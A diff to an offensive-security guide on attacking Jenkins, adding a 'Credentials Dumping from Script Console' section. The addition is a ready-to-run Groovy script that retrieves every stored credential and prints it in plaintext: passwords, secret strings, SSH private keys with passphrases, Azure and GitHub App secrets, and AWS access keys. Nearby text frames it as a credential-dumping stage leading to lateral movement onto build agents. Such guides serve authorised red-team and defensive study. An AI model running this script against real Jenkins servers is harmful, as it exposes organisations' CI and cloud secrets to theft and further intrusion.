@@ -65,7 +65,7 @@ stage('Credential Dumping') {
 
 <img src="credential-id-dumping.png">
 
-### Credentials & Configuration Dumping Build Agents Information
+## Credentials & Configuration Dumping Build Agents Information
 
 - This will be somewhat a borderline between credential dumping and lateral movement/backdooring.
 - If the Jenkins Controller use SSH to the build agents we can try to dump those ssh keys and get access to the build agents.
@@ -118,7 +118,45 @@ stage('Credential Dumping') {
 
 
 ## Credentials Dumping from Script Console
+``` Groovy
+//copied from https://gist.github.com/timja/04afb12c8ad909e400317a2ad9c88445
+import com.cloudbees.plugins.credentials.*
+import com.cloudbees.plugins.credentials.common.*
+import com.cloudbees.plugins.credentials.domains.*
+import com.cloudbees.plugins.credentials.impl.*
+import com.cloudbees.jenkins.plugins.sshcredentials.impl.*
+import org.jenkinsci.plugins.plaincredentials.impl.*
 
+  
+// def item = Jenkins.instance.getItem("your-folder")
+
+def creds = CredentialsProvider.lookupCredentials(
+        com.cloudbees.plugins.credentials.Credentials.class,
+        Jenkins.instance, // replace with item to get folder or item scoped credentials 
+        null,
+        null
+);
+
+for (credential in creds) {
+  if (credential instanceof UsernamePasswordCredentialsImpl) {
+    println credential.getId() + " " + credential.getUsername() + " " + credential.getPassword().getPlainText()
+  } else if (credential instanceof StringCredentialsImpl) {
+    println credential.getId() + " " + credential.getSecret().getPlainText() 
+  } else if(credential instanceof BasicSSHUserPrivateKey) {
+    println credential.getId() + " " + credential.getUsername() + "\n" + credential.getPrivateKey() + "\n Passphrase: " + credential.getPassphrase()
+  } else if (credential.getClass().toString() == "class com.microsoft.azure.util.AzureCredentials") {
+    println "AzureCred:" + credential.getSubscriptionId() + " " + credential.getClientId() + " " + credential.getPlainClientSecret() + " " + credential.getTenant()
+  } else if (credential.getClass().toString() == "class org.jenkinsci.plugins.github_branch_source.GitHubAppCredentials") {
+    println credential.getId() + " " + credential.getUsername() + "\n" + credential.getPrivateKey().getPlainText()
+  } else if (credential.getClass().toString() == "class com.cloudbees.jenkins.plugins.awscredentials.AWSCredentialsImpl") {
+    println credential.getId() + " " + credential.getAccessKey() + " " + credential.getSecretKey()
+  } else if (credential.getClass().toString() == "class com.microsoft.jenkins.keyvault.SecretStringCredentials"
+            || credential.getClass().toString() == "class org.jenkinsci.plugins.azurekeyvaultplugin.credentials.string.AzureSecretStringCredentials") {
+  } else {
+    println credential.getClass()
+  } 
+}
+```
 ## References
 - https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials 
 - https://www.jenkins.io/blog/2019/02/21/credentials-masking/
